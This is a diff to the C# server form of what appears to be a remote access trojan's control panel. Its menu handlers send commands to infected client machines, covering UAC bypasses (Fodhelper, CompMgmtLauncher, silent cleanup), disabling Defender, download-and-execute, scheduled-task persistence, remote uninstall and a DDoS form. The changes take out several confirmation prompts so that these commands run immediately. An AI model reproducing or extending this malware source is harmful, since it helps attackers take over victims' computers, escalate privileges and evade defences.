@@ -17,6 +17,9 @@ using System.Security.Cryptography.X509Certificates;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using cGeoIp;
+using System.Resources;
+using System.ComponentModel;
+using System.Globalization;
 
 namespace Server
 {
@@ -39,6 +42,7 @@ namespace Server
                 Text = "DOS",
             };
         }
+
 
         #region Form Helper
         private void CheckFiles()
@@ -141,6 +145,7 @@ namespace Server
                 }
             }
             catch { }
+
 
             CheckFiles();
             lvwColumnSorter = new ListViewColumnSorter();
@@ -277,7 +282,7 @@ namespace Server
 
         #endregion
 
-        
+
         #region Logs
         private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -387,7 +392,7 @@ namespace Server
             catch { }
         }
 
-        
+
 
         private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -567,7 +572,7 @@ namespace Server
         }
 
         #endregion
-                
+
         [DllImport("uxtheme", CharSet = CharSet.Unicode)]
         public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);
 
@@ -757,7 +762,7 @@ namespace Server
                 return;
             }
         }
-                
+
         private async void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
@@ -1051,13 +1056,13 @@ namespace Server
                 return;
             }
         }
-        
+
 
         private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             try
             {
-                string title = Interaction.InputBox("Alert when process activive.", "TITLE", "Uplay,QQ,Chrome,Edge,Word,Excel,PowerPoint,Epic,Steam");
+                string title = Interaction.InputBox("Alert when process activive.", "Title 标题", "Uplay,QQ,Chrome,Edge,Word,Excel,PowerPoint,Epic,Steam");
                 if (string.IsNullOrEmpty(title))
                     return;
                 else
@@ -1197,29 +1202,25 @@ namespace Server
 
         private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            DialogResult dialogResult = MessageBox.Show(this, "Be sure to uninstall?", "Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-            if (dialogResult == DialogResult.Yes)
+            try
             {
-                try
-                {
-                    MsgPack packet = new MsgPack();
-                    packet.ForcePathObject("Pac_ket").AsString = "uninstall";
+                MsgPack packet = new MsgPack();
+                packet.ForcePathObject("Pac_ket").AsString = "uninstall";
 
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
 
-                    foreach (Clients client in GetSelectedClients())
-                    {
-                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                    }
-                }
-                catch (Exception ex)
+                foreach (Clients client in GetSelectedClients())
                 {
-                    MessageBox.Show(ex.Message);
-                    return;
+                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
             }
         }
 
@@ -1394,7 +1395,7 @@ namespace Server
             }
         }
 
-        
+
         private readonly FormDOS formDOS;
         private void dDOSToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -1496,7 +1497,7 @@ namespace Server
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "Only for Admin", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                DialogResult dialogResult = MessageBox.Show(this, "Only for Admin.", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                 if (dialogResult == DialogResult.Yes)
                 {
                     try
@@ -1558,32 +1559,28 @@ namespace Server
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "For all OS version ,need user to allow.", "UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                if (dialogResult == DialogResult.Yes)
+                try
                 {
-                    try
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "uac";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
                     {
-                        MsgPack packet = new MsgPack();
-                        packet.ForcePathObject("Pac_ket").AsString = "uac";
-
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                        foreach (Clients client in GetSelectedClients())
+                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                         {
-                            if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
-                            {
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(ex.Message);
-                        return;
-                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
                 }
             }
         }
@@ -1592,66 +1589,55 @@ namespace Server
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "Using Slient CleanUp", "UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                if (dialogResult == DialogResult.Yes)
+                try
                 {
-                    try
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
                     {
-                        MsgPack packet = new MsgPack();
-                        packet.ForcePathObject("Pac_ket").AsString = "uacbypass";
-
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                        foreach (Clients client in GetSelectedClients())
+                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                         {
-                            if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
-                            {
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(ex.Message);
-                        return;
-                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
                 }
             }
         }
 
         private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count > 0) 
+            if (listView1.SelectedItems.Count > 0)
             {
-                string Msgbox = Interaction.InputBox("File name", "File name", @"calc.exe");
-                if (string.IsNullOrEmpty(Msgbox))
-                    return;
-                else
+                try
                 {
-                    try
-                    {
-                        MsgPack packet = new MsgPack();
-                        packet.ForcePathObject("Pac_ket").AsString = "startbypass";
-                        packet.ForcePathObject("filepath").AsString = Msgbox;
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "startbypass";
 
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
 
-                        foreach (Clients client in GetSelectedClients())
-                        {
-                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                        }
-                    }
-                    catch (Exception ex)
+                    foreach (Clients client in GetSelectedClients())
                     {
-                        MessageBox.Show(ex.Message);
-                        return;
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
                 }
             }
         }
@@ -1681,32 +1667,28 @@ namespace Server
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "Using Fodhelper.", "UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                if (dialogResult == DialogResult.Yes)
+                try
                 {
-                    try
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass3";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
                     {
-                        MsgPack packet = new MsgPack();
-                        packet.ForcePathObject("Pac_ket").AsString = "uacbypass3";
-
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                        foreach (Clients client in GetSelectedClients())
+                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                         {
-                            if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
-                            {
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(ex.Message);
-                        return;
-                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
                 }
             }
         }
@@ -1776,32 +1758,28 @@ namespace Server
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "Using CompMgmtLauncher.", "UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                if (dialogResult == DialogResult.Yes)
+                try
                 {
-                    try
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass2";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
                     {
-                        MsgPack packet = new MsgPack();
-                        packet.ForcePathObject("Pac_ket").AsString = "uacbypass2";
-
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
-                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                        foreach (Clients client in GetSelectedClients())
+                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                         {
-                            if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
-                            {
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(ex.Message);
-                        return;
-                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
                 }
             }
         }
@@ -1818,5 +1796,6 @@ namespace Server
                 formSetting.ShowDialog();
             }
         }
+
     }
 }
